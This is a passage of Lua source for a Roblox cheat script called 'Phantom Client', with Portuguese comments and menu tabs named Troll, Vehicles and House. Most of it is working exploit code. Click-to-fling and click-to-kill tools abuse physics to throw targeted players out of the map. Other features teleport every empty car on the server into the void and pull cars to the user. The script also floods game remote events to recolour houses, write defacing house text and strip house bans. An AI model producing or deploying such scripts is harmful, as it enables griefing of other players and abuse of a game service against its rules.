		math.random(-10e5, 10e5) * 10000
	)

	table.insert(ControlledDoors, {Part = part, Align = align})
end

-- Detecta e prepara portas existentes
for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end

-- Novas portas no futuro
Workspace.DescendantAdded:Connect(function(obj)
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end)

-- Flinga jogador com timeout e retorno
local function FlingPlayer(player)
	local char = player.Character
	if not char then return end
	local targetHRP = char:FindFirstChild("HumanoidRootPart")
	if not targetHRP then return end

	local targetAttachment = targetHRP:FindFirstChild("SHNMAX_TargetAttachment")
	if not targetAttachment then
		targetAttachment = Instance.new("Attachment", targetHRP)
		targetAttachment.Name = "SHNMAX_TargetAttachment"
	end

	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = targetAttachment
		end
	end

	local start = tick()
	local flingDetected = false

	while tick() - start < 5 do
		if targetHRP.Velocity.Magnitude >= 20 then
			flingDetected = true
			break
		end
		RunService.Heartbeat:Wait()
	end

	-- Sempre retorna as portas
	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = baseAttachment
		end
	end
end

-- Clique (funciona no mobile)
UserInputService.TouchTap:Connect(function(touchPositions, processed)
	if processed then return end
	local pos = touchPositions[1]
	local camera = Workspace.CurrentCamera
	local unitRay = camera:ScreenPointToRay(pos.X, pos.Y)
	local raycast = Workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000)

	if raycast and raycast.Instance then
		local hit = raycast.Instance
		local player = Players:GetPlayerFromCharacter(hit:FindFirstAncestorOfClass("Model"))
		if player and player ~= LocalPlayer then
			FlingPlayer(player)
		end
	end
end)
  end
})

Troll:AddButton({

    Name = "Click Fling Couch (Tool)",

    Callback = function()



local jogadores = game:GetService("Players")

local rep = game:GetService("ReplicatedStorage")

local entrada = game:GetService("UserInputService")

local eu = jogadores.LocalPlayer

local cam = workspace.CurrentCamera



local podeClicar = true

local ferramentaEquipada = false

local NOME_FERRAMENTA = "Click Fling Couch"



local mochila = eu:WaitForChild("Backpack")



if not mochila:FindFirstChild(NOME_FERRAMENTA) and not (eu.Character and eu.Character:FindFirstChild(NOME_FERRAMENTA)) then

    local ferramenta = Instance.new("Tool")

    ferramenta.Name = NOME_FERRAMENTA

    ferramenta.RequiresHandle = false

    ferramenta.CanBeDropped = false



    ferramenta.Equipped:Connect(function()

        ferramentaEquipada = true

    end)



    ferramenta.Unequipped:Connect(function()

        ferramentaEquipada = false

    end)



    ferramenta.Parent = mochila

end



local function jogarComSofa(alvo)

    if not ferramentaEquipada then return end

    if not alvo or not alvo.Character or alvo == eu then return end



    local jogando = true

    local raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")

    local alvoRaiz = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")

    if not raiz or not alvoRaiz then return end



    local boneco = eu.Character

    local humano = boneco:FindFirstChildOfClass("Humanoid")

    local posOriginal = raiz.CFrame



    rep:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")

    task.wait(0.2)



    rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

    task.wait(0.3)



    local sofa = eu.Backpack:FindFirstChild("Couch")

    if sofa then

        sofa.Parent = boneco

    end

    task.wait(0.1)



    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)

    task.wait(0.25)



    workspace.FallenPartsDestroyHeight = 0/0



    local forca = Instance.new("BodyVelocity")

    forca.Name = "ForcaJogada"

    forca.Velocity = Vector3.new(9e8, 9e8, 9e8)

    forca.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    forca.Parent = raiz



    humano:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    humano.PlatformStand = false

    cam.CameraSubject = alvo.Character:FindFirstChild("Head") or alvoRaiz or humano



    task.spawn(function()

        local angulo = 0

        local partes = {raiz}

        while jogando and alvo and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do

            local alvoHum = alvo.Character:FindFirstChildOfClass("Humanoid")

            if alvoHum.Sit then break end

            angulo += 50



            for _, parte in ipairs(partes) do

                local hrp = alvo.Character.HumanoidRootPart

                local pos = hrp.Position + hrp.Velocity / 1.5

                raiz.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angulo), 0, 0)

            end



            raiz.Velocity = Vector3.new(9e8, 9e8, 9e8)

            raiz.RotVelocity = Vector3.new(9e8, 9e8, 9e8)

            task.wait()

        end



        jogando = false

        forca:Destroy()

        humano:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

        humano.PlatformStand = false

        raiz.CFrame = posOriginal

        cam.CameraSubject = humano



        for _, p in pairs(boneco:GetDescendants()) do

            if p:IsA("BasePart") then

                p.Velocity = Vector3.zero

                p.RotVelocity = Vector3.zero

            end

        end



        humano:UnequipTools()

        rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

    end)



    while jogando do

        task.wait()

    end

end



entrada.TouchTap:Connect(function(toques, processado)

    if processado or not podeClicar or not ferramentaEquipada then return end



    local pos = toques[1]

    local raio = cam:ScreenPointToRay(pos.X, pos.Y)

    local acerto = workspace:Raycast(raio.Origin, raio.Direction * 1000)



    if acerto and acerto.Instance then

        local alvo = jogadores:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))

        if alvo and alvo ~= eu then

            podeClicar = false

            jogarComSofa(alvo)

            task.delay(2, function()

                podeClicar = true

            end)

        end

    end

end)

end

})

Troll:AddButton({

    Name = "Click Kill Couch (Tool)",

    Callback = function()



local jogadores = game:GetService("Players")

local rep = game:GetService("ReplicatedStorage")

local loop = game:GetService("RunService")

local mundo = game:GetService("Workspace")

local entrada = game:GetService("UserInputService")



local eu = jogadores.LocalPlayer

local cam = mundo.CurrentCamera



local NOME_FERRAMENTA = "Click Kill Couch"

local ferramentaEquipada = false

local nomeAlvo = nil

local loopTP = nil

local sofaEquipado = false

local base = nil

local posInicial = nil

local raiz = nil



local mochila = eu:WaitForChild("Backpack")

if not mochila:FindFirstChild(NOME_FERRAMENTA) then

    local ferramenta = Instance.new("Tool")

    ferramenta.Name = NOME_FERRAMENTA

    ferramenta.RequiresHandle = false

    ferramenta.CanBeDropped = false



    ferramenta.Equipped:Connect(function()

        ferramentaEquipada = true

    end)



    ferramenta.Unequipped:Connect(function()

        ferramentaEquipada = false

        nomeAlvo = nil

        limparSofa()

    end)



    ferramenta.Parent = mochila

end



function limparSofa()

    if loopTP then

        loopTP:Disconnect()

        loopTP = nil

    end



    if sofaEquipado then

        local boneco = eu.Character

        if boneco then

            local sofa = boneco:FindFirstChild("Couch")

            if sofa then

                sofa.Parent = eu.Backpack

                sofaEquipado = false

            end

        end

    end



    if base then

        base:Destroy()

        base = nil

    end



    if getgenv().AntiSit then

        getgenv().AntiSit:Set(false)

    end



    local humano = eu.Character and eu.Character:FindFirstChildOfClass("Humanoid")

    if humano then

        humano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)

        humano:ChangeState(Enum.HumanoidStateType.GettingUp)

    end



    if posInicial and raiz then

        raiz.CFrame = posInicial

        posInicial = nil

    end

end



function pegarSofa()

    local boneco = eu.Character

    if not boneco then return end

    local mochila = eu.Backpack



    if not mochila:FindFirstChild("Couch") and not boneco:FindFirstChild("Couch") then

        local args = { "PickingTools", "Couch" }

        rep.RE["1Too1l"]:InvokeServer(unpack(args))

        task.wait(0.1)

    end



    local sofa = mochila:FindFirstChild("Couch") or boneco:FindFirstChild("Couch")

    if sofa then

        sofa.Parent = boneco

        sofaEquipado = true

    end

end



function posAleatoriaAbaixo(boneco)

    local rp = boneco:FindFirstChild("HumanoidRootPart")

    if not rp then return Vector3.new() end

    local offset = Vector3.new(math.random(-2, 2), -5.1, math.random(-2, 2))

    return rp.Position + offset

end



function tpAbaixo(alvo)

    if not alvo or not alvo.Character or not alvo.Character:FindFirstChild("HumanoidRootPart") then return end



    local meuBoneco = eu.Character

    local minhaRaiz = meuBoneco and meuBoneco:FindFirstChild("HumanoidRootPart")

    local humano = meuBoneco and meuBoneco:FindFirstChildOfClass("Humanoid")



    if not minhaRaiz or not humano then return end



    humano:SetStateEnabled(Enum.HumanoidStateType.Physics, false)



    if not base then

        base = Instance.new("Part")

        base.Size = Vector3.new(10, 1, 10)

        base.Anchored = true

        base.CanCollide = true

        base.Transparency = 0.5

        base.Parent = mundo

    end



    local destino = posAleatoriaAbaixo(alvo.Character)

    base.Position = destino

    minhaRaiz.CFrame = CFrame.new(destino)



    humano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)

end



function arremessarComSofa(alvo)

    if not alvo then return end

    nomeAlvo = alvo.Name

    local boneco = eu.Character

    if not boneco then return end



    posInicial = boneco:FindFirstChild("HumanoidRootPart") and boneco.HumanoidRootPart.CFrame

    raiz = boneco:FindFirstChild("HumanoidRootPart")

    pegarSofa()



    loopTP = loop.Heartbeat:Connect(function()

        local alvoAtual = jogadores:FindFirstChild(nomeAlvo)

        if not alvoAtual or not alvoAtual.Character or not alvoAtual.Character:FindFirstChild("Humanoid") then

            limparSofa()

            return

        end

        if getgenv().AntiSit then

            getgenv().AntiSit:Set(true)

        end

        tpAbaixo(alvoAtual)

    end)



    task.spawn(function()

        local alvoAtual = jogadores:FindFirstChild(nomeAlvo)

        while alvoAtual and alvoAtual.Character and alvoAtual.Character:FindFirstChild("Humanoid") do

            task.wait(0.05)

            if alvoAtual.Character.Humanoid.SeatPart then

                local buraco = CFrame.new(265.46, -450.83, -59.93)

                alvoAtual.Character.HumanoidRootPart.CFrame = buraco

                eu.Character.HumanoidRootPart.CFrame = buraco

                task.wait(0.4)

                limparSofa()

                task.wait(0.2)

                if posInicial then

                    eu.Character.HumanoidRootPart.CFrame = posInicial

                end

                break

            end

        end

    end)

end



entrada.TouchTap:Connect(function(toques, processado)

    if not ferramentaEquipada or processado then return end

    local pos = toques[1]

    local raio = cam:ScreenPointToRay(pos.X, pos.Y)

    local hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)

    if hit and hit.Instance then

        local modelo = hit.Instance:FindFirstAncestorOfClass("Model")

        local jogador = jogadores:GetPlayerFromCharacter(modelo)

        if jogador and jogador ~= eu then

            arremessarComSofa(jogador)

        end

    end

end)

end

})

local CarTab = Window:MakeTab({"Vehicles", "car"})

local Section = CarTab:AddSection({"Speed Functions"})

local speedValue = 200
local turboValue = 11.3

local function getAllCars()
    local cars = {}
    if workspace:FindFirstChild("Vehicles") then
        for _, vehicle in pairs(workspace.Vehicles:GetChildren()) do
            if vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat") then
                table.insert(cars, vehicle)
            end
        end
    end
    return cars
end

local function applyToAllCars(valueType, value)
    local cars = getAllCars()
    local carsModified = 0

    for _, car in pairs(cars) do
        local seat = car.Seats.VehicleSeat
        local target = seat:FindFirstChild(valueType)

        if target and target.Value ~= nil then
            target.Value = value
            carsModified += 1
        else
            pcall(function()
                seat[valueType] = value
                carsModified += 1
            end)
        end
    end

    newNotify("Phantom Client", "Phantom Client " .. carsModified .. " cars modified")
end

CarTab:AddTextBox({
    Title = "Car Speed",
    Placeholder = "Example: 300",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            speedValue = num
            newNotify("Phantom Client", "Speed set to: " .. num)
        else
            newNotify("Phantom Client", "Invalid number")
        end
    end
})

CarTab:AddTextBox({
    Title = "Turbo Power",
    Placeholder = "Example: 15",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            turboValue = num
            newNotify("Phantom Client", "Turbo set to: " .. num)
        else
            newNotify("Phantom Client", "Invalid number")
        end
    end
})

CarTab:AddButton({
    Title = "Apply Speed",
    Callback = function()
        applyToAllCars("MaxSpeed", speedValue)
    end
})

CarTab:AddButton({
    Title = "Apply Turbo",
    Callback = function()
        applyToAllCars("Turbo", turboValue)
    end
})

local Section = CarTab:AddSection({"all car functions"})


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- Namespace para evitar conflitos
local TeleportCarro = {}
TeleportCarro.Players = Players
TeleportCarro.Workspace = Workspace
TeleportCarro.LocalPlayer = LocalPlayer
TeleportCarro.Camera = Camera

-- Função para exibir notificação
function TeleportCarro:MostrarNotificacao(mensagem)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aviso",
            Text = mensagem,
            Duration = 5
        })
    end)
end

-- Função para desativar/ativar dano de queda
function TeleportCarro:ToggleFallDamage(disable)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return false end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if disable then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
        return true
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        return false
    end
end

-- Função para teleportar o jogador para o assento do carro
function TeleportCarro:TeleportToSeat(seat, car)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
        self:MostrarNotificacao("Personagem não encontrado!")
        return false
    end
    local humanoid = self.LocalPlayer.Character.Humanoid
    local rootPart = self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        self:MostrarNotificacao("Parte raiz do personagem não encontrada!")
        return false
    end

    humanoid.Sit = false
    task.wait(0.1)

    rootPart.CFrame = seat.CFrame + Vector3.new(0, 5, 0)
    task.wait(0.1)

    seat:Sit(humanoid)
    task.wait(0.5)
    return humanoid.SeatPart == seat
end

-- Função para teleportar o carro para o void com delay
function TeleportCarro:TeleportToVoid(car)
    if not car then
        self:MostrarNotificacao("Veículo inválido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veículo não encontrada!")
            return
        end
    end
    local voidPosition = Vector3.new(0, -1000, 0)
    car:SetPrimaryPartCFrame(CFrame.new(voidPosition))
    task.wait(0.5)
end

-- Função para teleportar o carro para a posição do jogador com delay
function TeleportCarro:TeleportToPlayer(car, playerPos)
    if not car then
        self:MostrarNotificacao("Veículo inválido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veículo não encontrada!")
            return
        end
    end
    local targetPos = playerPos + Vector3.new(5, 0, 5)
    car:SetPrimaryPartCFrame(CFrame.new(targetPos))
    task.wait(0.5)
end

-- Função para sair do carro e voltar à posição original
function TeleportCarro:ExitCarAndReturn(originalPos)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if humanoid.SeatPart then
        humanoid.Sit = false
    end
    task.wait(0.1)
    if originalPos then
        self.LocalPlayer.Character:PivotTo(CFrame.new(originalPos))
    end
end

-- Função para atualizar a lista de carros no dropdown
function TeleportCarro:AtualizarListaCarros()
    local pastaVeiculos = self.Workspace:FindFirstChild("Vehicles")
    local listaCarros = {}
    
    if pastaVeiculos then
        for _, carro in ipairs(pastaVeiculos:GetChildren()) do
            if carro.Name:match("Car$") then
                table.insert(listaCarros, carro.Name)
            end
        end
    end
    
    return listaCarros
end


-- Toggle para matar todos os carros
CarTab:AddToggle({
    Name = "Matar todos os carros do server",
    Description = "Teleporta os carros vazios para o void sequencialmente",
    Default = false,
    Callback = function(state)
        -- Variável de controle externa para parar o loop se o toggle for desligado
        _G.KillAllCarsActive = state 

        if state then
            spawn(function()
                local player = TeleportCarro.LocalPlayer
                local character = player.Character
                if not character or not character:FindFirstChild("HumanoidRootPart") then
                    TeleportCarro:MostrarNotificacao("Personagem não encontrado!")
                    return
                end

                local originalPosition = character.HumanoidRootPart.Position
                local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
                
                if not vehiclesFolder then
                    TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
                    return
                end

                -- Desativa dano de queda antes de começar o processo
                TeleportCarro:ToggleFallDamage(true)

                -- Pegamos a lista de carros no momento do clique
                local cars = vehiclesFolder:GetChildren()

                for _, car in ipairs(cars) do
                    -- Verifica se o usuário desligou o toggle durante o processo
                    if not _G.KillAllCarsActive then break end

                    -- Filtra se é um carro (baseado no seu padrão de nome ou classe)
                    if car.Name:match("Car$") or car:IsA("Model") then
                        local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
                        
                        -- Só tenta se o assento existir e estiver vazio
                        if vehicleSeat and not vehicleSeat.Occupant then
                            local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                            
                            if success then
                                task.wait(0.1) -- Pequeno delay para garantir que o server reconheceu que você sentou
                                TeleportCarro:TeleportToVoid(car)
                                TeleportCarro:ExitCarAndReturn(originalPosition)
                                task.wait(0.5) -- Delay entre um carro e outro para evitar crash/kick
                            end
                        end
                    end
                end

                -- Finaliza o processo
                TeleportCarro:ToggleFallDamage(false)
                TeleportCarro:MostrarNotificacao("Limpeza de carros finalizada!")
            end)
        else
            _G.KillAllCarsActive = false
            TeleportCarro:ToggleFallDamage(false)
        end
    end
})


local Section = CarTab:AddSection({"functions dos carro"})

-- Criar o dropdown
local Dropdown = CarTab:AddDropdown({
    Name = "Selecionar Carro do Jogador",
    Description = "Selecione o carro de um jogador",
    Default = nil,
    Options = TeleportCarro:AtualizarListaCarros(),
    Callback = function(carroSelecionado)
        _G.SelectedVehicle = carroSelecionado
    end
})

-- Toggle para ver a câmera do carro selecionado
CarTab:AddToggle({
    Name = "Ver Câmera do Carro Selecionado",
    Description = "Foca a câmera no carro selecionado",
    Default = false,
    Callback = function(state)
        if state then
            if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
                TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
                return
            end

            local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
            if not vehiclesFolder then
                TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
                return
            end

            local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
            if not vehicle then
                TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
                return
            end

            local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
            if not vehicleSeat then
                TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
                return
            end

            -- Salvar o estado original da câmera
            TeleportCarro.OriginalCameraSubject = TeleportCarro.Camera.CameraSubject
            TeleportCarro.OriginalCameraType = TeleportCarro.Camera.CameraType

            -- Ajustar a câmera para o assento do carro, mesmo se ocupado
            TeleportCarro.Camera.CameraSubject = vehicleSeat
            TeleportCarro.Camera.CameraType = Enum.CameraType.Follow
            TeleportCarro:MostrarNotificacao("Câmera ajustada para o carro " .. _G.SelectedVehicle .. "!")
        else
            -- Restaurar a câmera ao estado original
            if TeleportCarro.OriginalCameraSubject then
                TeleportCarro.Camera.CameraSubject = TeleportCarro.OriginalCameraSubject
                TeleportCarro.Camera.CameraType = TeleportCarro.OriginalCameraType or Enum.CameraType.Custom
                TeleportCarro:MostrarNotificacao("Câmera restaurada ao normal!")
                TeleportCarro.OriginalCameraSubject = nil
                TeleportCarro.OriginalCameraType = nil
            end
        end
    end
})

-- Atualizar o dropdown dinamicamente
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildAdded:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildRemoved:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)

local Section = CarTab:AddSection({"functions kill e trazer"})

-- Botão para destruir carro selecionado
CarTab:AddButton({
    Name = "Destruir Carro Selecionado",
    Description = "Teleporta o carro selecionado para o void",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("O kill car não foi possível, há alguém sentado no assento do motorista!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToVoid(vehicle)
            TeleportCarro:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para o void!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Falha ao sentar no carro!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- Botão para trazer carro selecionado
CarTab:AddButton({
    Name = "Trazer Carro Selecionado",
    Description = "Teleporta o carro selecionado para sua posição",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("O teleporte do carro não foi possível, há alguém sentado no assento do motorista!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToPlayer(vehicle, originalPos)
            TeleportCarro:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para você!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Falha ao sentar no carro!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- Botão para trazer todos os carros
CarTab:AddButton({
    Name = "Trazer Todos os Carros",
    Description = "Teleporta todos os carros do servidor para sua posição",
    Callback = function()
        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local cars = {}
        for _, car in ipairs(vehiclesFolder:GetChildren()) do
            if car.Name:match("Car$") then
                table.insert(cars, car)
            end
        end

        for _, car in ipairs(cars) do
            local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
            if vehicleSeat and vehicleSeat.Occupant == nil then
                local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                if success then
                    TeleportCarro:TeleportToPlayer(car, originalPos)
                    TeleportCarro:ExitCarAndReturn(originalPos)
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " foi teleportado para você!")
                    task.wait(1)
                else
                    TeleportCarro:MostrarNotificacao("Falha ao sentar no carro " .. car.Name .. "!")
                end
            else
                if vehicleSeat then
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " ignorado: alguém está no assento do motorista!")
                else
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " ignorado: assento não encontrado!")
                end
            end
        end

        TeleportCarro:ToggleFallDamage(false)
        if #cars == 0 then
            TeleportCarro:MostrarNotificacao("Nenhum carro disponível para teleportar!")
        end
    end
})

-- Manter o estado de dano de queda ao recarregar o personagem
local fallDamageDisabled = false
TeleportCarro.LocalPlayer.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid")
    if fallDamageDisabled then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
    end
end)

CarTab:AddSection({"Vehicle - Rgb"})
local function vehiclergb()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local player = Players.LocalPlayer
    local remote = player:WaitForChild("PlayerGui")
        :WaitForChild("MainGUIHandler")
        :WaitForChild("VehicleControl")
        :WaitForChild("UIColorPicker")
        :WaitForChild("SetColor")

    return RunService.RenderStepped:Connect(function()
        local color = Color3.fromRGB(
            math.random(0, 255),
            math.random(0, 255),
            math.random(0, 255)
        )
        remote:FireServer(color)
    end)
end

local vehicleRgbConnection

CarTab:AddToggle({
    Name = "Vehicle - Rgb",
    Default = false,
    Callback = function(value)
        if value then
            if not vehicleRgbConnection then
                vehicleRgbConnection = vehiclergb()
            end
            print("RGB CAR ativado")
        else
            if vehicleRgbConnection then
                vehicleRgbConnection:Disconnect()
                vehicleRgbConnection = nil
            end
            print("RGB CAR desativado")
        end
    end
})

local HouseTab = Window:MakeTab({"House", "home"})
HouseTab:AddSection({"Your House"})
local RunService = game:GetService("RunService")
local rgbHouse = false
local rgbConnection

HouseTab:AddToggle({
    Name = "House - Rgb",
    Default = false,
    Callback = function(value)
        rgbHouse = value

        if rgbHouse then
            rgbConnection = RunService.RenderStepped:Connect(function()
                local color = Color3.fromHSV(
                    math.random(),
                    1,
                    1
                )

                local args = {
                    "ColorPickHouse",
                    color
                }

                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1Player1sHous1e")
                    :FireServer(unpack(args))
            end)
        else
            if rgbConnection then
                rgbConnection:Disconnect()
                rgbConnection = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local houseTextRgb = false
local houseTextConnection

HouseTab:AddToggle({
    Name = "Housetext - Rgb",
    Default = false,
    Callback = function(value)
        houseTextRgb = value

        if houseTextRgb then
            houseTextConnection = RunService.RenderStepped:Connect(function()
                local color = Color3.fromHSV(
                    math.random(),
                    1,
                    1
                )

                local args = {
                    "PickingBusinessNameColor",
                    color
                }

                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1tColo1r")
                    :FireServer(unpack(args))
            end)
        else
            if houseTextConnection then
                houseTextConnection:Disconnect()
                houseTextConnection = nil
            end
        end
    end
})
HouseTab:AddSection({"Hack3d Housetext"})
local RunService = game:GetService("RunService")

local hackedHouseText = false
local hackedConnection
local lastUpdate = 0
local state = false

local texts = {
    "Phantom Client",
    "Phantom Client On Top",
    "KitKat Hub",
    "Phantom Client as here",
    "hi The Darknesxz",
    "Boom!!!"
}

HouseTab:AddToggle({
    Name = "Apply Hack3d Housetext",
    Default = false,
    Callback = function(value)
        hackedHouseText = value

        if hackedHouseText then
            hackedConnection = RunService.RenderStepped:Connect(function()
                if tick() - lastUpdate < 0.35 then return end
                lastUpdate = tick()

                state = not state

                -- Alterna cor (preto / verde)
                local color = state and Color3.new(0, 0, 0) or Color3.new(0, 1, 0)

                -- Texto aleatório estilizado
                local text = texts[math.random(1, #texts)]

                -- Aplica texto
                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1t")
                    :FireServer("BusinessName", text)

                -- Aplica cor
                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1tColo1r")
                    :FireServer("PickingBusinessNameColor", color)
            end)
        else
            if hackedConnection then
                hackedConnection:Disconnect()
                hackedConnection = nil
            end
        end
    end
})
HouseTab:AddSection({"Other Houses"})
HouseTab:AddButton({
    Name = "Remover Ban de Todas as Casas",
    Description = "Tenta remover o ban de todas as casas ",
    Callback = function()
        local successCount = 0
        local failCount = 0
        for i = 1, 37 do
